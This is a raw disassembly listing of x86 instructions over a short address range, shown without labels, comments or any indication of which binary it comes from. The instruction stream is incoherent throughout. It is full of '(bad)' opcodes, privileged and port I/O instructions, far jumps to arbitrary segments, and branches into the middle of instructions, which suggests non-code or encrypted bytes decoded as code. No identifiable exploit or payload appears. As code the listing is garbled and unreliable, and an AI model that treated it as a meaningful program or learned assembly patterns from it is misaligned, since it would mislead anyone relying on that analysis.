  41681d:	xchg   esp,eax
  41681e:	adc    eax,0x7b7dba6e
  416823:	fiadd  WORD PTR [ebx-0x6d]
  416826:	add    BYTE PTR [edi+0x6b424f28],0x33
  41682d:	(bad)  
  41682e:	lahf   
  41682f:	lds    eax,FWORD PTR [ebx]
  416831:	adc    edi,DWORD PTR [edx+ebx*2+0x7e2b9e75]
  416838:	inc    ebp
  416839:	lods   al,BYTE PTR ds:[esi]
  41683a:	dec    ecx
  41683b:	cs in  eax,dx
  41683d:	dec    ebx
  41683e:	push   ebx
  41683f:	pop    ecx
  416840:	ja     0x4167cc
  416842:	ret    
  416843:	sub    dl,cl
  416845:	jmp    0xbb2549cf
  41684a:	xchg   edx,eax
  41684b:	mov    BYTE PTR [eax+0x23925786],cl
  416851:	mov    ebx,0x34ca46de
  416856:	xor    al,0xc7
  416858:	and    edi,DWORD PTR [ebx+0x33]
  41685b:	test   DWORD PTR ds:0xcb233495,ebx
  416861:	dec    esp
  416862:	sub    al,BYTE PTR [esi-0x40]
  416865:	addr16 stc 
  416867:	cwde   
  416868:	popa   
  416869:	cli    
  41686a:	push   DWORD PTR ds:[ebp-0x3aeb51e1]
  416871:	aad    0x3d
  416873:	fistp  QWORD PTR [edx]
  416875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416876:	ret    0xd8ea
  416879:	dec    eax
  41687a:	dec    edx
  41687b:	push   eax
  41687c:	fs jp  0x416822
  41687f:	clc    
  416880:	mov    dl,0x5
  416882:	cvtps2pi mm5,xmm5
  416885:	out    0x85,al
  416887:	and    eax,0xa3367c58
  41688c:	cli    
  41688d:	pop    ss
  41688e:	cmp    BYTE PTR [eax+0x6f],ch
  416891:	test   DWORD PTR [eax],ecx
  416893:	iret   
  416894:	mov    dh,0x8d
  416896:	lea    eax,[ecx+0x77f411ca]
  41689c:	(bad)  
  41689d:	sahf   
  41689e:	jnp    0x41686a
  4168a0:	es jmp 0x982c:0xde0fa18f
  4168a8:	out    dx,al
  4168a9:	sbb    DWORD PTR [esi+0x14db30b0],edi
  4168af:	dec    edi
  4168b0:	cld    
  4168b1:	jae    0x4168a6
  4168b3:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168b5:	sar    DWORD PTR [ecx+0x6d],1
  4168b8:	fwait
  4168b9:	scas   al,BYTE PTR es:[edi]
  4168ba:	dec    edi
  4168bb:	stos   BYTE PTR es:[edi],al
  4168bc:	ins    BYTE PTR es:[edi],dx
  4168bd:	dec    ecx
  4168be:	mov    al,0xb6
  4168c0:	pop    es
  4168c1:	push   edi
  4168c2:	jbe    0x4168f5
  4168c4:	mov    cl,0x2
  4168c6:	xor    al,cl
  4168c8:	test   al,0xe
  4168ca:	dec    BYTE PTR [esi-0x1d72f749]
  4168d0:	jno    0x4168e7
  4168d2:	bound  esi,QWORD PTR [edx-0x7c]
  4168d5:	lahf   
  4168d6:	mov    cl,0xca
  4168d8:	sar    ecx,cl
  4168da:	push   ecx
  4168db:	fs push eax
  4168dd:	dec    edi
  4168de:	sbb    ah,BYTE PTR [ebx-0x24]
  4168e1:	nop
  4168e2:	(bad)
  4168e6:	mov    cl,0xfe
  4168e8:	jbe    0x416918
  4168ea:	jae    0x41686d
  4168ec:	sub    DWORD PTR [ebp-0x55],eax
  4168ef:	adc    al,0x7a
  4168f1:	fimul  WORD PTR [ebx]
  4168f3:	dec    esp
  4168f4:	mov    eax,ds:0x5c6bbf21
  4168f9:	cmp    al,dl
  4168fb:	or     eax,0x5ab12a1a
  416900:	js     0x416893
  416902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416903:	jge    0x416906
  416905:	push   esp
  416906:	pop    edi
  416907:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416908:	clc    
  416909:	mov    al,ds:0xaa1f41c1
  41690e:	push   ecx
  41690f:	(bad)  
  416911:	mov    dl,0x73
  416913:	sub    edi,eax
  416915:	aam    0x15
  416917:	sahf   
  416918:	call   DWORD PTR [eax]
  41691a:	shl    BYTE PTR [ecx],cl
  41691c:	call   0x7da0f59c
  416921:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416922:	or     al,0xd7
  416924:	mov    al,0x5
  416926:	push   ebx
  416927:	push   0xe528c158
  41692c:	das    
  41692d:	lds    edi,FWORD PTR [ebx+0x9]
  416930:	test   al,0x82
  416932:	pushf  
  416933:	push   es
  416934:	mov    ebx,0xb50914b3
  416939:	dec    esp
  41693a:	sbb    al,0x30
  41693c:	repnz lea ebx,[eax]
  41693f:	inc    eax
  416940:	and    al,0x1e
  416942:	ja     0x73a6c4c4
  416948:	add    al,0xb7
  41694a:	out    dx,eax
  41694b:	pop    ecx
  41694c:	popf   
  41694d:	adc    BYTE PTR [eax+edi*1-0x7982032c],ah
  416954:	dec    esi
  416955:	or     BYTE PTR [esi+0xa0bde11],cl
  41695b:	out    dx,eax
  41695c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41695d:	jbe    0x416982
  41695f:	push   ecx
  416960:	push   esp
  416961:	repnz push cs
  416963:	xor    dh,BYTE PTR ds:0x91a0bdb0
  416969:	push   0x38
  41696b:	fidivr DWORD PTR [ecx]
  41696d:	xchg   esp,eax
  41696e:	dec    edi
  41696f:	imul   ebp,DWORD PTR [esi+eiz*2+0x28a2f44c],0x51
  416977:	cmp    eax,0x1d258c00
  41697c:	lock cmc 
  41697e:	test   bl,ch
  416980:	mov    edx,0x204343c2
  416985:	in     ax,dx
  416987:	inc    edi
  416988:	jmp    0x71bd:0x1160857e
  41698f:	mov    al,0xae
  416991:	push   ecx
  416992:	test   eax,0x30a69114
  416997:	xchg   edx,eax
  416998:	ffree  st(0)
  41699a:	push   esi
  41699b:	xchg   esi,eax
  41699c:	scas   eax,DWORD PTR es:[edi]
  41699d:	xor    eax,0xbaeb1401
  4169a2:	fcmovbe st,st(4)
  4169a4:	inc    esi
  4169a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169a6:	mov    ebx,0xfa96de43
  4169ab:	dec    ebx
  4169ac:	mov    dh,0x50
  4169ae:	inc    ebx
  4169af:	sbb    BYTE PTR [edx],al
  4169b1:	sbb    al,0x5e
  4169b3:	aaa    
  4169b4:	popf   
  4169b5:	jb     0x416a08
  4169b7:	shl    al,0xa2
  4169ba:	fcomip st,st(3)
  4169bc:	sbb    BYTE PTR [eax+0x73c21fb],ch
  4169c2:	pushf  
  4169c3:	jns    0x416a42
  4169c5:	sahf   
  4169c6:	leave  
  4169c7:	push   0x364a1a71
  4169cc:	xchg   DWORD PTR [edi+0x2f707505],esp
  4169d2:	xor    DWORD PTR [ecx*8+0xad3f838],ebp
  4169d9:	jmp    0x416995
  4169db:	jge    0xb6efcb4c
  4169e1:	cmp    al,0x91
  4169e3:	hlt    
  4169e4:	(bad)  
  4169e5:	cmp    bl,BYTE PTR [ecx-0x5d]
  4169e8:	push   ebp
  4169e9:	push   ds
  4169ea:	push   ecx
  4169eb:	push   ecx
  4169ec:	dec    edi
  4169ed:	push   eax
  4169ee:	test   DWORD PTR [ecx],0xd2d98bcf
  4169f4:	jmp    0xff47:0x17471465
  4169fb:	out    0x5b,al
  4169fd:	push   ebx
  4169fe:	stc    
  4169ff:	rcr    ah,cl
  416a01:	mov    dl,0xb6
  416a03:	xchg   edi,eax
  416a04:	scas   eax,DWORD PTR es:[edi]
  416a05:	mov    ds:0x1043b23e,eax
  416a0a:	mov    ecx,0xbbaf32c
  416a0f:	adc    ch,dh
  416a11:	(bad)  
  416a12:	pop    edx
  416a13:	dec    ebx
  416a14:	sbb    ebp,esp
  416a16:	mov    ?,WORD PTR [eax-0x7b]
  416a19:	adc    al,0x81
  416a1b:	jo     0x4169ac
  416a1d:	lock mov ch,0x37
  416a20:	inc    ebx
  416a21:	call   0x4481:0xb65e8de5
  416a28:	add    BYTE PTR [esp+edx*1],ah
  416a2b:	xor    al,bl
  416a2d:	lds    ecx,FWORD PTR [edx+0x1c]
  416a30:	mov    esp,ds
  416a32:	fcom   DWORD PTR [ecx+0x3e2a0800]
  416a38:	xor    al,0x99
  416a3a:	lods   eax,DWORD PTR ds:[esi]
  416a3b:	enter  0xb189,0xdc
  416a3f:	loop   0x416a51
  416a41:	test   esi,esi
  416a43:	aad    0x5
  416a45:	jns    0x416a2f
  416a47:	leave  
  416a48:	mul    DWORD PTR [edi-0xde0391e]
  416a4e:	js     0x4169e7
  416a50:	mov    esi,eax
  416a52:	pusha  
  416a53:	call   0x9b16:0xcc27e568
  416a5a:	mov    al,ds:0x2913d8a2
  416a5f:	fucomp st(4)
  416a61:	jno    0x416a7a
  416a63:	andnps xmm4,xmm0
  416a66:	int    0x34
  416a68:	mov    bh,0x3a
  416a6a:	adc    DWORD PTR es:[esi],edi
  416a6d:	push   0xffffffce
  416a6f:	mov    cl,0x78
  416a71:	iret   
  416a72:	mov    dl,0xf5
  416a74:	in     al,0x98
  416a76:	cwde   
  416a77:	mov    ebx,0x505d161b
  416a7c:	lds    esp,FWORD PTR [esp+ebp*2+0x62]
  416a80:	cs (bad) 
  416a82:	iret   
  416a83:	and    DWORD PTR [esi+0x77],0x290681ef
  416a8a:	into   
  416a8b:	sub    bl,BYTE PTR [ebx-0x3e9f33b5]
  416a91:	cmp    DWORD PTR [eax+0x66ed921f],esi
  416a97:	outs   dx,BYTE PTR ds:[esi]
  416a98:	aad    0xbe
  416a9a:	pop    edi
  416a9b:	pop    eax
  416a9c:	mov    edi,0xb0e8b98
  416aa1:	add    al,0x31
  416aa3:	test   eax,0xbf424682
  416aa8:	jle    0x416b15
  416aaa:	pop    es
  416aab:	iret   
  416aac:	rcr    DWORD PTR [eax+0x57ffbcb5],0xaf
  416ab3:	sub    ecx,edx
  416ab5:	pop    es
  416ab6:	fcmovnbe st,st(4)
  416ab8:	xchg   ecx,ebp
  416aba:	stc    
  416abb:	pop    esp
  416abc:	jp     0x416a86
  416abe:	mov    edi,0xda99a3a8
  416ac3:	xchg   esi,eax
  416ac4:	mov    BYTE PTR [esi],ah
  416ac6:	lock imul ecx,esp,0xb99e559c
  416acd:	sbb    eax,0xa8f52d7a
  416ad2:	or     eax,0xb33dc797
  416ad7:	mov    edx,0xd3fe16da
  416adc:	xchg   ecx,eax
  416add:	mov    ds:0xc7b28dd0,eax
  416ae2:	cwde   
  416ae3:	pop    ds
  416ae4:	jbe    0x416b1b
  416ae6:	scas   eax,DWORD PTR es:[edi]
  416ae7:	jge    0x416a6d
  416ae9:	jmp    0x7ee5b9ce
  416aee:	daa    
  416aef:	nop
  416af0:	les    ebx,FWORD PTR [esi+0x82d34a8]
  416af6:	test   BYTE PTR [esi],bl
  416af8:	jle    0x416b51
  416afa:	push   ebp
  416afb:	fsubr  DWORD PTR [ebx-0x70]
  416afe:	aas    
  416aff:	mov    eax,ds:0x5eaca61b
  416b04:	ins    DWORD PTR es:[edi],dx
  416b05:	dec    esi
  416b06:	fidiv  DWORD PTR [esi+ebp*2+0x763dbdaa]
  416b0d:	adc    esp,DWORD PTR [esp+edi*2]
  416b10:	jecxz  0x416b85
  416b12:	rol    DWORD PTR [ebx-0x61],cl
  416b15:	push   ss
  416b16:	mov    edx,0xe98b69de
  416b1b:	sub    al,0x54
  416b1d:	mov    esi,0x36a68c61
  416b22:	cdq    
  416b23:	mov    edx,0x697204c4
  416b28:	add    BYTE PTR [edi-0x48],ch
  416b2b:	stos   DWORD PTR es:[edi],eax
  416b2c:	in     al,dx
  416b2d:	sbb    eax,0xec05bd37
  416b32:	ss jns 0x416b8d
  416b35:	xchg   ebx,eax
  416b36:	pop    ecx
  416b37:	jecxz  0x416b46
  416b39:	inc    eax
  416b3a:	(bad)  
  416b3b:	loop   0x416bb6
  416b3d:	mov    ebx,0xbc9d50fe
  416b42:	fldenv [edx+0x7317e974]
  416b48:	pushf  
  416b49:	inc    ebx
  416b4a:	jg     0x416b54
  416b4c:	call   DWORD PTR [esi]
  416b4e:	sub    ah,BYTE PTR [ecx]
  416b50:	cdq    
  416b51:	jg     0x416af5
  416b53:	pop    edi
  416b54:	sub    DWORD PTR [ecx+0x2c],edi
  416b57:	hlt    
  416b58:	cld    
  416b59:	imul   ecx,DWORD PTR [ebx],0xf9da0c5c
  416b5f:	cdq    
  416b60:	rcr    BYTE PTR [edi+0x11afa19d],cl
  416b66:	inc    esi
  416b67:	mov    eax,ds:0x64cd6f94
  416b6c:	sbb    esp,DWORD PTR [eax+ecx*8]
  416b6f:	fisttp QWORD PTR [edi]
  416b71:	add    DWORD PTR [ecx+0x2a2805e4],eax
  416b77:	mov    DWORD PTR [edx+0x5bc4fa94],eax
  416b7d:	sub    cl,BYTE PTR [ebx+0x6d]
  416b80:	rcr    DWORD PTR [ebp+0x4585e740],cl
  416b86:	mov    bh,0x62
  416b88:	mov    dl,0x23
  416b8a:	fwait
  416b8b:	test   BYTE PTR [ebx+0x3b1d7aca],0x4
  416b92:	les    edx,FWORD PTR [edi]
  416b94:	xor    esp,edx
  416b96:	arpl   bp,ax
  416b98:	addr16 inc esp
  416b9a:	push   edx
  416b9b:	add    BYTE PTR ds:0xf8735f44,cl
  416ba1:	pushfw 
  416ba3:	jnp    0x416bc1
  416ba5:	les    ebp,FWORD PTR [ebx-0x33]
  416ba8:	pop    ecx
  416ba9:	pop    eax
  416baa:	popa   
  416bab:	add    BYTE PTR [edi],ch
  416bad:	pop    es
  416bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416baf:	adc    eax,0xdc415c16
  416bb4:	pop    esp
  416bb5:	push   0xc7f3b8f6
  416bba:	mov    ah,0xc
  416bbc:	dec    eax
  416bbd:	div    DWORD PTR [esi+eiz*1]
  416bc0:	test   DWORD PTR [ebx+ecx*2],ebp
  416bc3:	inc    eax
  416bc4:	cmovg  ecx,DWORD PTR [ecx+0x1f]
  416bc8:	repnz pushw ds
  416bcb:	sub    BYTE PTR [ebx],0xe7
  416bce:	and    DWORD PTR [eax-0x17],esi
  416bd1:	mov    cx,ss
  416bd4:	inc    edi
  416bd5:	rcr    DWORD PTR [ebp+0x3c],cl
  416bd8:	aad    0x4c
  416bda:	mov    bl,bl
  416bdc:	add    ah,BYTE PTR [ebp+ebx*1+0x727c9c16]
  416be3:	loopne 0x416bda
  416be5:	pop    ebp
  416be6:	lock adc BYTE PTR [ebx+0x72],ah
  416bea:	out    dx,al
  416beb:	std    
  416bec:	inc    esi
  416bed:	mov    esi,0xc96130be
  416bf2:	xor    BYTE PTR [ebp-0x63],dl
  416bf5:	gs jo  0x416b95
  416bf8:	fmul   QWORD PTR [ebp+0x19]
  416bfb:	mov    ss,WORD PTR [edx+eax*8-0x2c]
  416bff:	or     DWORD PTR [esi+0x33831e9],esp
  416c05:	leave  
  416c06:	inc    ebp
  416c07:	mov    bl,0xca
  416c09:	ret    0x9bb3
  416c0c:	or     ebx,ebp
  416c0e:	add    edi,DWORD PTR [edi+0x2a]
  416c11:	xor    edi,DWORD PTR [edi-0x89cdc73]
  416c17:	push   ebp
  416c18:	and    al,0x18
  416c1a:	pusha  
  416c1b:	xlat   BYTE PTR ds:[ebx]
  416c1c:	addr16 (bad) 
  416c1e:	mov    bl,0x84
  416c20:	pop    esi
  416c21:	jmp    0x22cfbab3
  416c26:	sbb    dh,BYTE PTR [edx]
  416c28:	out    dx,eax
  416c29:	xor    edi,DWORD PTR [edi]
  416c2b:	pop    ecx
  416c2c:	fsubrp st(4),st
  416c2e:	aaa    
  416c2f:	pop    edi
  416c30:	or     dh,dh
  416c32:	jg     0x416bf2
  416c34:	shr    BYTE PTR [edi],1
  416c36:	jae    0x416c04
  416c38:	sub    DWORD PTR [esi],esp
  416c3a:	mov    ebx,0xb6874213
  416c3f:	cdq    
  416c40:	mov    esi,0x7cb3bead
  416c45:	nop
  416c46:	xchg   esi,eax
  416c47:	cmc    
  416c48:	mov    esi,ebx
  416c4a:	adc    al,bl
  416c4c:	mov    eax,ds:0x4be420db
  416c51:	iret   
  416c52:	xchg   ebp,eax
  416c53:	std    
  416c54:	ja     0x416cbb
  416c56:	lods   al,BYTE PTR ds:[esi]
  416c57:	in     al,dx
  416c58:	or     ah,bh
  416c5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c5b:	idiv   ebx
  416c5d:	and    eax,0x41ab0c2c
  416c62:	push   ds
  416c63:	cs out dx,al
  416c65:	gs jae 0x416c2f
  416c68:	mov    ebx,0xbf13c62e
  416c6d:	xchg   ecx,eax
  416c6e:	pop    eax
  416c6f:	jmp    0x5052fee4
  416c74:	loope  0x416bfd
  416c76:	cmp    BYTE PTR [ebx-0x64093c3b],0x37
  416c7d:	cmp    DWORD PTR [ebx+0x1e],edi
  416c80:	fwait
  416c81:	cmp    DWORD PTR [esi+0x4cfa7860],ebp
  416c87:	or     DWORD PTR [esi],0x48
  416c8a:	sbb    al,0x13
  416c8c:	out    0x91,al
  416c8e:	int3   
  416c8f:	loopne 0x416c69
  416c91:	loope  0x416c6c
  416c93:	int    0xf6
  416c95:	adc    ebp,DWORD PTR [edx+0x58]
  416c98:	xchg   DWORD PTR [eax+eax*8],edx
  416c9b:	mov    ecx,0x913e1d85
  416ca0:	out    0x54,al
  416ca2:	ret    0xfa0c
  416ca5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ca6:	mov    edx,0x52d302cf
  416cab:	adc    al,0x2f
  416cad:	jb     0x416c93
  416caf:	aaa    
  416cb0:	outs   dx,DWORD PTR ds:[esi]
  416cb1:	jmp    0xc1e7:0x70610f7d
  416cb8:	jmp    0x416cce
  416cba:	mov    ebp,0x4091ec27
  416cbf:	add    eax,0xd41c79ee
  416cc4:	(bad)  
  416cc5:	dec    ebx
  416cc6:	xor    bl,dl
  416cc8:	jl     0x416d15
  416cca:	mov    BYTE PTR [esi],ch
  416ccc:	fcomi  st,st(6)
  416cce:	ficomp WORD PTR [ebx+0x56109736]
  416cd4:	bound  edi,QWORD PTR [edi]
  416cd6:	cmp    DWORD PTR [ebx-0x288f13f5],0x47fd7bb5
  416ce0:	popf   
  416ce1:	pop    ebx
  416ce2:	xchg   edi,eax
  416ce3:	hlt    
  416ce4:	inc    ebp
  416ce5:	jmp    0xdca2:0xf6b69dc0
  416cec:	jg     0x416d69
  416cee:	lahf   
  416cef:	mov    cs,WORD PTR [ebx+0x77]
  416cf2:	or     al,BYTE PTR [eax+0x61d6cafd]
  416cf8:	scas   al,BYTE PTR es:[edi]
  416cf9:	int    0xbd
  416cfb:	inc    esi
  416cfc:	iret   
  416cfd:	(bad)  
  416cfe:	rcl    esi,cl
  416d00:	aaa    
  416d01:	fwait
  416d02:	cmp    ebp,DWORD PTR [eax]
  416d04:	dec    eax
  416d05:	jg     0x416ce2
  416d07:	pop    eax
  416d08:	mov    ds:0xb0c6cff5,al
  416d0d:	(bad)  
  416d0e:	sub    eax,0xcc1a4175
  416d13:	pusha  
  416d14:	(bad)  
  416d15:	cmp    BYTE PTR [eax],cl
  416d17:	pushf  
  416d18:	sbb    edi,DWORD PTR [ebx+0x13b45fa3]
  416d1e:	mov    dh,0x65
  416d20:	adc    DWORD PTR [ecx-0x3b],esi
  416d23:	fimul  DWORD PTR [eax+ebx*1-0x25]
  416d27:	mov    cl,0x93
  416d29:	pusha  
  416d2a:	xor    DWORD PTR [edx],edi
  416d2c:	sub    al,0x8a
  416d2e:	ret    0xb235
  416d31:	adc    sp,0x18de
  416d36:	call   0xc53fd77
  416d3b:	jmp    0x416cdf
  416d3d:	in     eax,0xa2
  416d3f:	inc    ecx
  416d40:	(bad)  
  416d41:	sub    bl,BYTE PTR [ebx]
  416d43:	add    bh,BYTE PTR [eax+0x31a9c2a2]
  416d49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d4a:	push   edx
  416d4b:	mov    ecx,0x6aff5659
  416d50:	and    bh,BYTE PTR [eax-0x6]
  416d53:	repnz nop
  416d55:	popa   
  416d56:	pop    ebx
  416d57:	lea    eax,[ecx+0x27eeb689]
  416d5d:	inc    eax
  416d5e:	pop    ecx
  416d5f:	add    BYTE PTR [ecx+0xb51c251],dh
  416d65:	pop    ebp
  416d66:	push   0x453e8f02
  416d6b:	sub    eax,0x527090fe
  416d70:	and    DWORD PTR [ebp+0x9f30c12],0x6
  416d77:	or     al,0x80
  416d79:	add    eax,0x44433b8
  416d7e:	sub    bl,BYTE PTR [ebx-0x1305466a]
  416d84:	icebp  
  416d85:	push   eax
  416d86:	loopne 0x416e04
  416d88:	pop    edx
  416d89:	xchg   esp,eax
  416d8a:	adc    DWORD PTR [ecx+0x19],eax
  416d8d:	lods   al,BYTE PTR ds:[esi]
  416d8e:	lahf   
  416d8f:	not    BYTE PTR ds:0x9e0e5dd6
  416d95:	rol    DWORD PTR [edi+eiz*4+0x6c3c3f7],0xaa
  416d9d:	xor    ecx,DWORD PTR [eax+0x74]
  416da0:	test   DWORD PTR [esi+0x5f],esp
  416da3:	xor    DWORD PTR [edi-0x7c16d466],esi
  416da9:	repz mov dh,0x96
  416dac:	mov    bl,0xce
  416dae:	inc    eax
  416daf:	mov    ah,0x33
  416db1:	sbb    al,0xaf
  416db3:	test   al,0x34
  416db5:	test   BYTE PTR [edx-0x14],al
  416db8:	push   esp
  416db9:	jae    0x416dd4
  416dbb:	fild   DWORD PTR [edx]
  416dbd:	gs mov ecx,0x1f119808
  416dc3:	xor    esi,ebp
  416dc5:	xlat   BYTE PTR ds:[ebx]
  416dc6:	inc    ebp
  416dc7:	sbb    DWORD PTR [esi+0x6b50c47d],esi
  416dcd:	sub    BYTE PTR [eax-0x767dd41],bh
  416dd3:	das    
  416dd4:	fdiv   QWORD PTR [eax]
  416dd6:	sbb    ah,BYTE PTR [ecx]
  416dd8:	(bad)
  416ddb:	push   esp
  416ddc:	in     al,0x25
  416dde:	pop    esi
  416ddf:	add    al,0xd9
  416de1:	stc    
  416de2:	cdq    
  416de3:	mov    WORD PTR [esi-0x79],?
  416de6:	mov    ecx,cs
  416de8:	inc    ecx
  416de9:	sbb    ah,BYTE PTR [esi+0x6b30e6c7]
  416def:	adc    esi,DWORD PTR [esi]
  416df1:	retf   0xfa92
  416df4:	fwait
  416df5:	mov    ds:0x1e00f9f3,al
  416dfa:	adc    esi,ebx
  416dfc:	xchg   al,ch
  416dfe:	ins    DWORD PTR es:[edi],dx
  416dff:	mov    WORD PTR [edi-0x71],cs
  416e02:	sbb    BYTE PTR [esi+eax*2],al
  416e05:	scas   al,BYTE PTR es:[edi]
  416e06:	pusha  
  416e07:	xchg   BYTE PTR [edx],ch
  416e09:	outs   dx,DWORD PTR ds:[esi]
  416e0a:	test   esp,esi
  416e0c:	pop    esi
  416e0d:	cmp    al,0x36
  416e0f:	sbb    bh,BYTE PTR [ecx]
  416e11:	call   0xe381:0x530fe5cd
  416e18:	mov    esp,0xc2a03f27
  416e1d:	loopne 0x416dcf
  416e1f:	xor    eax,DWORD PTR [edx-0x7f]
  416e22:	lods   al,BYTE PTR ds:[esi]
  416e23:	adc    bl,ch
  416e25:	mov    ecx,ds
  416e27:	xor    BYTE PTR [esi-0x75],ah
  416e2a:	adc    al,BYTE PTR [esi+0x399c9fa]
  416e30:	inc    cx
  416e32:	idiv   BYTE PTR [ecx-0x69ddcd37]
  416e38:	ss xchg ebp,eax
  416e3a:	stos   BYTE PTR es:[edi],al
  416e3b:	push   ecx
  416e3c:	or     al,0xe1
  416e3e:	call   0x14e40c00
  416e43:	pop    ss
  416e44:	adc    esp,DWORD PTR [ecx-0x42]
  416e47:	out    0xf3,al
  416e49:	pop    ebx
  416e4a:	std    
  416e4b:	out    0x86,eax
  416e4d:	jl     0x416de0
  416e4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e50:	add    DWORD PTR [eax-0x6c045779],eax
  416e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e57:	and    ecx,eax
  416e59:	sbb    BYTE PTR [ebx+eiz*4+0x1],dl
  416e5d:	test   eax,0xb645fd82
  416e62:	dec    edx
  416e63:	pop    esp
  416e64:	cmp    esp,edi
  416e66:	scas   al,BYTE PTR es:[edi]
  416e67:	push   ebx
  416e68:	lock push ebx
  416e6a:	jne    0x416e11
  416e6c:	and    eax,0xe6b9f509
  416e71:	mov    dl,0x1
  416e73:	jns    0x416e12
  416e75:	aad    0x6e
  416e77:	iret   
  416e78:	(bad)  
  416e7a:	fnstenv [ebp+edi*2-0x519cb71d]
  416e81:	sbb    eax,0x749a9f15
  416e86:	push   esi
  416e87:	in     eax,0x2c
  416e89:	push   ebx
  416e8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e8b:	add    edx,eax
  416e8d:	jae    0x416e1f
  416e8f:	(bad)  
  416e90:	in     eax,dx
  416e91:	mov    ah,BYTE PTR [eax+0x5d1c2c4c]
  416e97:	scas   al,BYTE PTR es:[edi]
  416e98:	jg     0x416ecd
  416e9a:	inc    esp
  416e9b:	or     BYTE PTR [ecx+esi*1+0x79],cl
  416e9f:	mov    edx,0x6fb2f6c4
  416ea4:	fisub  DWORD PTR [edi+0x9]
  416ea7:	loope  0x416ee4
  416ea9:	dec    esi
  416eaa:	xor    DWORD PTR [edi-0x28059385],ebp
  416eb0:	dec    esi
  416eb1:	das    
  416eb2:	cmp    dl,BYTE PTR [ebx-0x64a72a4e]
  416eb8:	dec    edx
  416eb9:	add    al,bl
  416ebb:	mov    dl,0x70
  416ebd:	mov    ah,0x86
  416ebf:	aam    0x40
  416ec1:	jmp    0x416e92
  416ec3:	in     al,dx
  416ec4:	ret    
  416ec5:	cmp    DWORD PTR [edi+0x66ce055f],0xffffff82
  416ecc:	or     ah,BYTE PTR [ecx+0x58]
  416ecf:	pop    edi
  416ed0:	inc    edi
  416ed1:	es sub al,0x20
  416ed4:	lock mov ch,BYTE PTR [edi-0x1c]
  416ed8:	outs   dx,BYTE PTR ds:[esi]
  416ed9:	nop
  416eda:	xchg   esp,eax
  416edb:	inc    esi
  416edc:	loope  0x416f5b
  416ede:	xlat   BYTE PTR ds:[ebx]
  416edf:	mov    BYTE PTR [ebp-0x26],al
  416ee2:	shr    DWORD PTR [ebp-0xe],cl
  416ee5:	mov    bh,0x71
  416ee7:	jnp    0x416e8f
  416ee9:	add    BYTE PTR [edi+0x3b38a129],0xd9
  416ef0:	sub    bl,BYTE PTR ds:0x95d40fca
  416ef6:	or     al,0x4d
  416ef8:	adc    DWORD PTR [edi-0x3212a9ad],ecx
  416efe:	in     eax,dx
  416eff:	jbe    0x416ea2
  416f01:	fild   WORD PTR [esi-0x5a]
  416f04:	loope  0x416ecc
  416f06:	and    eax,0x183ba12d
  416f0b:	out    0x38,al
  416f0d:	imul   ecx,DWORD PTR [ebx],0x2f61e4cf
  416f13:	pop    edi
  416f14:	jo     0x6dda6a9b
  416f1a:	sub    al,0x55
  416f1c:	mov    ch,0x51
  416f1e:	pop    edx
  416f1f:	push   eax
  416f20:	inc    edx
  416f21:	in     al,dx
  416f22:	and    eax,0xb961ba1
  416f27:	fild   WORD PTR [ebp-0x1dd09a45]
  416f2d:	aaa    
  416f2e:	inc    eax
  416f2f:	ror    BYTE PTR [edx],cl
  416f31:	sbb    edx,esi
  416f33:	cmp    BYTE PTR [ebp+ebp*2+0x56a0f6a3],dh
  416f3a:	cmp    al,0xe7
  416f3c:	enter  0x9d1f,0x50
  416f40:	mov    eax,0xcbc83f83
  416f45:	xor    eax,0x99f7daef
  416f4a:	(bad)  
  416f4c:	mov    ds:0xa3fe4172,al
  416f51:	push   0x6a80c6b0
  416f56:	loopne 0x416f2d
  416f58:	sub    eax,0x8dd95fa3
  416f5d:	sub    eax,0x95505ebc
  416f62:	jp     0x416f3c
  416f64:	int    0x71
  416f66:	imul   edi,DWORD PTR [ebx-0x4651fa8],0xffffff98
  416f6d:	mov    ebx,0x9ef0eeb
  416f72:	sub    al,BYTE PTR [eax]
  416f74:	dec    ebx
  416f75:	scas   eax,DWORD PTR es:[edi]
  416f76:	sahf   
  416f77:	add    al,0x8a
  416f79:	sti    
  416f7a:	and    DWORD PTR [eax+eax*2+0x7d26d153],0x5a467e44
  416f85:	mov    dh,0x6c
  416f87:	mov    al,0xe
  416f89:	xchg   esi,eax
  416f8a:	loope  0x416fa3
  416f8c:	aas    
  416f8d:	sbb    al,0x3a
  416f8f:	mov    cl,0xca
  416f91:	and    al,0x77
  416f93:	in     eax,0xb5
  416f95:	stos   DWORD PTR es:[di],eax
  416f97:	lahf   
  416f98:	push   esp
  416f99:	sub    eax,0x8628b939
  416f9e:	iret   
  416f9f:	aad    0x89
  416fa1:	int3   
  416fa2:	xchg   edx,eax
  416fa3:	pop    ecx
  416fa4:	adc    bh,cl
  416fa6:	jb     0x417001
  416fa8:	ret    0x8bb0
  416fab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fac:	add    esi,ecx
  416fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416faf:	jge    0x417001
  416fb1:	into   
  416fb2:	sbb    edi,DWORD PTR [edi]
  416fb4:	lds    ecx,FWORD PTR [edi+esi*8+0x21]
  416fb8:	xchg   ecx,eax
  416fb9:	loope  0x417011
  416fbb:	out    dx,al
  416fbc:	inc    edx
  416fbd:	(bad)  
  416fbe:	or     al,0x53
  416fc0:	adc    cl,BYTE PTR [esi+0x4acde032]
  416fc6:	sbb    eax,0x728b8d88
  416fcb:	fsub   DWORD PTR [edi+0x61]
  416fce:	inc    esp
  416fcf:	shl    DWORD PTR ds:0xcfcd95f3,1
  416fd5:	les    ecx,FWORD PTR [esi]
  416fd7:	mov    al,ds:0xa3e915a
  416fdc:	mov    ch,0x99
  416fde:	les    ecx,FWORD PTR [edx-0xa]
  416fe1:	pop    ebx
